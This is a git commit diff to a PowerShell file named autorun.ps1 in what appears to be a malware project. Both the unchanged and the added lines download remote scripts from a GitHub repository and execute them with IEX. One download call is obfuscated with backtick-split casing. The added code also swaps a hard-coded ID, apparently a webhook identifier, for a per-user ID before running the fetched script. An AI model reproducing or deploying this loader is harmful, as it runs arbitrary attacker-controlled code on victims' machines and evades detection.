5a43455ad5fbac94268dff18b195de9287a36438
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:34:51 +0700

    Update autorun.ps1

--- Extras/autorun.ps1
+++ Extras/autorun.ps1
@@ -1,4 +1,10 @@
 $codeuser = ("https://raw.githubusercontent.com/43a1723/test/main/usertelegram/$userid/main.ps1")
 $downloaduser = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$codeuser')"
 Start-Process "powershell" -Argument "`$userid=$userid;IEX($downloaduser)"
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1" -useb)
+
+$powershell_url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/download.ps1"
+
+#replace YOUR_WEBHOOK_HERE with $webhook
+$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "1255292055182114876", "$userid"
+
+iex $content
